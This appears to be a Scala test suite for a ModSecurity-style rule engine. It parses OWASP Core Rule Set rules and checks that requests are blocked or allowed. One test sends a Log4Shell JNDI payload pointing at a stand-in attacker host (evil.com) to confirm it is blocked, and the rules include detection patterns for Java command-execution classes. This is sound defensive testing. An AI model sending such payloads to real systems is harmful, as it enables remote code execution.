package com.cloud.apim.seclang.test

import com.cloud.apim.seclang.model.Disposition._
import com.cloud.apim.seclang.model._
import com.cloud.apim.seclang.scaladsl.SecLang
import play.api.libs.json._

import java.net.URI
import java.net.http.{HttpClient, HttpRequest, HttpResponse}
import scala.concurrent.duration.Duration

object Stats {

  def runStats[T](rounds: Int)(f: => T): Unit = {
    require(rounds > 0, "rounds must be > 0")

    val times = (1 to rounds).map { _ =>
      val start = System.nanoTime()
      f
      System.nanoTime() - start
    }

    val total = times.sum
    val min = times.min
    val max = times.max
    val avg = total / rounds

    def fmt(ns: Long): String =
      Duration.fromNanos(ns).toMillis + " ms"

    println(s"Runs        : $rounds")
    println(s"Total time  : ${fmt(total)}")
    println(s"Min         : ${fmt(min)}")
    println(s"Max         : ${fmt(max)}")
    println(s"Average     : ${fmt(avg)}")
  }
}

class SecLangBasicTest extends munit.FunSuite {

  test("antlr") {
    val rules =
      """
        |SecRule ARGS|ARGS_NAMES|REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_BODY|REQUEST_HEADERS|XML:/*|XML://@* \
        |    "@rx java\.lang\.(?:runtime|processbuilder)" \
        |    "id:944100,\
        |    phase:2,\
        |    block,\
        |    t:none,t:lowercase,\
        |    msg:'Remote Command Execution: Suspicious Java class detected',\
        |    logdata:'Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}',\
        |    tag:'application-multi',\
        |    tag:'language-java',\
        |    tag:'platform-multi',\
        |    tag:'attack-rce',\
        |    tag:'paranoia-level/1',\
        |    tag:'OWASP_CRS',\
        |    tag:'OWASP_CRS/ATTACK-JAVA',\
        |    tag:'capec/1000/152/137/6',\
        |    ver:'OWASP_CRS/4.22.0-dev',\
        |    severity:'CRITICAL',\
        |    setvar:'tx.rce_score=+%{tx.critical_anomaly_score}',\
        |    setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'"
        |""".stripMargin
    val res = SecLang.parse(rules)
    assert(res.isRight, "rules has been parsed")
  }

  test("antlr_crs") {
    val client = HttpClient.newHttpClient()
    println("fetching files")
    val files: Map[String, String] = List(
      "asp-dotnet-errors.data",
      "iis-errors.data",
      "java-classes.data",
      "lfi-os-files.data",
      "php-errors.data",
      "php-function-names-933150.data",
      "php-variables.data",
      "restricted-files.data",
      "restricted-upload.data",
      "ruby-errors.data",
      "scanners-user-agents.data",
      "sql-errors.data",
      "ssrf.data",
      "unix-shell-builtins.data",
      "unix-shell.data",
      "web-shells-asp.data",
      "web-shells-php.data",
      "windows-powershell-commands.data",
    )
      .map(v => (v, s"https://raw.githubusercontent.com/coreruleset/coreruleset/refs/heads/main/rules/${v}"))
      .map {
        case (key, url) =>
          println(s"fetching file: ${url}")
          val request = HttpRequest.newBuilder()
            .uri(URI.create(url))
            .GET()
            .build()
          val response = client.send(
            request,
            HttpResponse.BodyHandlers.ofString()
          )
          (key, response.body())
      }.toMap

    println("fetching CRS ...")
    val rules = (Seq(
      // "https://raw.githubusercontent.com/corazawaf/coraza-proxy-wasm/refs/heads/main/wasmplugin/rules/coraza.conf-recommended.conf",
      "https://raw.githubusercontent.com/coreruleset/coreruleset/refs/heads/main/crs-setup.conf.example"
    ) ++ (List(
      "REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.conf.example",
      "REQUEST-901-INITIALIZATION.conf",
      "REQUEST-905-COMMON-EXCEPTIONS.conf",
      "REQUEST-911-METHOD-ENFORCEMENT.conf",
      "REQUEST-913-SCANNER-DETECTION.conf",
      "REQUEST-920-PROTOCOL-ENFORCEMENT.conf",
      "REQUEST-921-PROTOCOL-ATTACK.conf",
      "REQUEST-922-MULTIPART-ATTACK.conf",
      "REQUEST-930-APPLICATION-ATTACK-LFI.conf",
      "REQUEST-931-APPLICATION-ATTACK-RFI.conf",
      "REQUEST-932-APPLICATION-ATTACK-RCE.conf",
      "REQUEST-933-APPLICATION-ATTACK-PHP.conf",
      "REQUEST-934-APPLICATION-ATTACK-GENERIC.conf",
      "REQUEST-941-APPLICATION-ATTACK-XSS.conf",
      "REQUEST-942-APPLICATION-ATTACK-SQLI.conf",
      "REQUEST-943-APPLICATION-ATTACK-SESSION-FIXATION.conf",
      "REQUEST-944-APPLICATION-ATTACK-JAVA.conf",
      "REQUEST-949-BLOCKING-EVALUATION.conf",
      "RESPONSE-950-DATA-LEAKAGES.conf",
      "RESPONSE-951-DATA-LEAKAGES-SQL.conf",
      "RESPONSE-952-DATA-LEAKAGES-JAVA.conf",
      "RESPONSE-953-DATA-LEAKAGES-PHP.conf",
      "RESPONSE-954-DATA-LEAKAGES-IIS.conf",
      "RESPONSE-955-WEB-SHELLS.conf",
      "RESPONSE-956-DATA-LEAKAGES-RUBY.conf",
      "RESPONSE-959-BLOCKING-EVALUATION.conf",
      "RESPONSE-980-CORRELATION.conf",
      "RESPONSE-999-EXCLUSION-RULES-AFTER-CRS.conf.example",
    )
      .map(v => s"https://raw.githubusercontent.com/coreruleset/coreruleset/refs/heads/main/rules/${v}")))
      .map { url =>
        println(s"fetching rules: ${url} ...")
        val request = HttpRequest.newBuilder()
          .uri(URI.create(url))
          .GET()
          .build()
        val response = client.send(
          request,
          HttpResponse.BodyHandlers.ofString()
        )
        response.body()
      }
      .mkString("\n")
    println("fetching CRS done !\n\n")
    val start = System.currentTimeMillis()
    SecLang.parse(rules) match {
      case Left(err) => println("parse error: " + err)
      case Right(config) => {
        val program = SecLang.compile(config)
        val engine = SecLang.engine(program, files = files)
        val stop = System.currentTimeMillis()

        val out1 = Json.prettyPrint(config.json)
        java.nio.file.Files.writeString(new java.io.File("./crs.json").toPath, out1)
        val config2 = Configuration.format.reads(Json.parse(out1)).get
        val out2 = Json.prettyPrint(config2.json)
        assertEquals(out1, out2)

        val passing_ctx = RequestContext(
          method = "GET",
          uri = "/",
          headers = Map(
            "Host" -> List("www.owasp.org"),
            "User-Agent" -> List("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"),
          )
        )
        println("passing")
        engine.evaluate(passing_ctx, phases = List(1, 2)).displayPrintln()
        println("failing")
        val failing_ctx = RequestContext(
          method = "GET",
          uri = "/",
          headers = Map(
            "Host" -> List("www.foo.bar"),
            "Apikey" -> List("${jndi:ldap://evil.com/a}"),
            "User-Agent" -> List("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"),
          ),
          query = Map("q" -> List("test")),
          body = None
        )
        val start2 = System.currentTimeMillis()
        val failing_res = engine.evaluate(failing_ctx, phases = List(1, 2))
        val stop2 = System.currentTimeMillis()
        failing_res.displayPrintln()
        assertEquals(failing_res.disposition, Block(400, Some("Potential Remote Command Execution: Log4j / Log4shell"), Some(944150)))
        println(s"engine ready in: ${stop - start} ms")
        println(s"request handled in: ${stop2 - start2} ms")
        // Stats.runStats(100) {
        //   engine.evaluate(failing_ctx, phases = List(1, 2))
        // }
      }
    }
  }

  test("simple rules") {

    val rules = """
                  |SecRule REQUEST_HEADERS:User-Agent "@pm firefox" \
                  |    "id:00001,\
                  |    phase:1,\
                  |    block,\
                  |    t:none,t:lowercase,\
                  |    msg:'someone used firefox to access',\
                  |    logdata:'someone used firefox to access',\
                  |    tag:'test',\
                  |    ver:'0.0.0-dev',\
                  |    status:403,\
                  |    severity:'CRITICAL'"
                  |
                  |SecRule REQUEST_URI "@contains /health" \
                  |    "id:00002,\
                  |    phase:1,\
                  |    pass,\
                  |    t:none,t:lowercase,\
                  |    msg:'someone called /health',\
                  |    logdata:'someone called /health',\
                  |    tag:'test',\
                  |    ver:'0.0.0-dev'"
                  |
                  |SecRuleEngine On
                  |""".stripMargin

    val loaded = SecLang.parse(rules).fold(err => sys.error(err), identity)
    val program = SecLang.compile(loaded)
    val engine = SecLang.engine(program)

    val failing_ctx_2 = RequestContext(
      method = "GET",
      uri = "/",
      headers = Map("User-Agent" -> List("Firefox/128.0")),
      query = Map("q" -> List("test")),
      body = None
    )
    val passing_ctx_1 = RequestContext(
      method = "GET",
      uri = "/health",
      headers = Map("User-Agent" -> List("curl/8.0")),
      query = Map("q" -> List("test")),
      body = None
    )
    val passing_ctx_2 = RequestContext(
      method = "GET",
      uri = "/admin",
      headers = Map("User-Agent" -> List("chrome/8.0")),
      query = Map("q" -> List("test")),
      body = None
    )

    val failing_res_2 = engine.evaluate(failing_ctx_2, phases = List(1, 2)).displayPrintln()
    val passing_res_1 = engine.evaluate(passing_ctx_1, phases = List(1, 2)).displayPrintln()
    val passing_res_2 = engine.evaluate(passing_ctx_2, phases = List(1, 2)).displayPrintln()

    assertEquals(failing_res_2.disposition, Block(403, Some("someone used firefox to access"), Some(1)))
    assertEquals(passing_res_1.disposition, Continue)
    assertEquals(passing_res_2.disposition, Continue)
  }

  test("chain of rules") {
    val rules = """
                  |SecRule REQUEST_HEADERS:User-Agent "@pm firefox" \
                  |    "id:00001,\
                  |    phase:1,\
                  |    block,\
                  |    t:none,t:lowercase,\
                  |    msg:'someone used firefox to access',\
                  |    logdata:'someone used firefox to access',\
                  |    tag:'test',\
                  |    ver:'0.0.0-dev',\
                  |    severity:'CRITICAL'"
                  |
                  |SecRule REQUEST_URI "@contains /health" \
                  |    "id:00002,\
                  |    phase:1,\
                  |    pass,\
                  |    t:none,t:lowercase,\
                  |    msg:'someone called /health',\
                  |    logdata:'someone called /health',\
                  |    tag:'test',\
                  |    ver:'0.0.0-dev'"
                  |
                  |SecRule REQUEST_URI "@rx ^/admin" \
                  |    "id:00003,\
                  |    phase:1,\
                  |    pass,\
                  |    t:none,t:lowercase,\
                  |    msg:'request on /admin',\
                  |    nolog,\
                  |    tag:'test',\
                  |    ver:'0.0.0-dev',\
                  |    chain"
                  |    SecRule REQUEST_HEADERS:User-Agent "@rx curl" \
                  |      "block,\
                  |      t:none,t:lowercase,\
                  |      msg:'someone used curl to access',\
                  |      logdata:'someone used curl to access',\
                  |      severity:'CRITICAL'"
                  |
                  |SecRuleEngine On
                  |""".stripMargin

    val loaded  = SecLang.parse(rules).fold(err => sys.error(err), identity)
    val program = SecLang.compile(loaded)
    val engine  = SecLang.engine(program)
    val failing_ctx_1 = RequestContext(
      method = "GET",
      uri = "/admin",
      headers = Map("User-Agent" -> List("curl/8.0")),
      query = Map("q" -> List("test")),
      body = None
    )
    val failing_ctx_2 = RequestContext(
      method = "GET",
      uri = "/",
      headers = Map("User-Agent" -> List("Firefox/128.0")),
      query = Map("q" -> List("test")),
      body = None
    )
    val passing_ctx_1 = RequestContext(
      method = "GET",
      uri = "/health",
      headers = Map("User-Agent" -> List("curl/8.0")),
      query = Map("q" -> List("test")),
      body = None
    )
    val passing_ctx_2 = RequestContext(
      method = "GET",
      uri = "/admin",
      headers = Map("User-Agent" -> List("Chrome/8.0")),
      query = Map("q" -> List("test")),
      body = None
    )
    val failing_res_1 = engine.evaluate(failing_ctx_1, phases = List(1, 2)).displayPrintln()
    val failing_res_2 = engine.evaluate(failing_ctx_2, phases = List(1, 2)).displayPrintln()
    val passing_res_1 = engine.evaluate(passing_ctx_1, phases = List(1, 2)).displayPrintln()
    val passing_res_2 = engine.evaluate(passing_ctx_2, phases = List(1, 2)).displayPrintln()
    assertEquals(failing_res_1.disposition, Block(400, Some("someone used curl to access"), Some(3)))
    assertEquals(failing_res_2.disposition, Block(400, Some("someone used firefox to access"), Some(1)))
    assertEquals(passing_res_1.disposition, Continue)
    assertEquals(passing_res_2.disposition, Continue)
  }

  test("Get actual negated variables") {
    val parsed = SecLang.parse(
      """
        |SecRule REQUEST_HEADERS|!REQUEST_HEADERS:User-Agent|!REQUEST_HEADERS:Referer|!REQUEST_HEADERS:Cookie|!REQUEST_HEADERS:Sec-Fetch-User|!REQUEST_HEADERS:Sec-CH-UA|!REQUEST_HEADERS:Sec-CH-UA-Mobile "@validateByteRange 32,34,38,42-59,61,65-90,95,97-122" \
        |    "id:920274,\
        |    phase:1,\
        |    block,\
        |    t:none,t:urlDecodeUni,\
        |    msg:'Invalid character in request headers (outside of very strict set)',\
        |    logdata:'%{MATCHED_VAR_NAME}=%{MATCHED_VAR}',\
        |    tag:'application-multi',\
        |    tag:'language-multi',\
        |    tag:'platform-multi',\
        |    tag:'attack-protocol',\
        |    tag:'paranoia-level/4',\
        |    tag:'OWASP_CRS',\
        |    tag:'OWASP_CRS/PROTOCOL-ENFORCEMENT',\
        |    tag:'capec/1000/210/272',\
        |    ver:'OWASP_CRS/4.22.0-dev',\
        |    severity:'CRITICAL',\
        |    setvar:'tx.inbound_anomaly_score_pl4=+%{tx.critical_anomaly_score}'"
        |""".stripMargin).right.get
    val compiled = SecLang.compile(parsed)
    val engine = SecLang.engine(compiled,SecLangEngineConfig.default.copy(debugRules = List(920274)))
    val ctx = CRSTestUtils.requestContext(Json.parse(
      s"""{
         |  "dest_addr" : "127.0.0.1",
         |  "port" : 80,
         |  "uri" : "/get?test=test1HI",
         |  "headers" : {
         |    "User-Agent" : "OWASP CRS test agent",
         |    "Host" : "localhost",
         |    "Cookie" : "ThisIsATest%60",
         |    "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
         |  },
         |  "version" : "HTTP/1.1"
         |}""".stripMargin))
    val res = engine.evaluate(ctx, List(1, 2, 3, 4))
    res.displayPrintln()
  }
}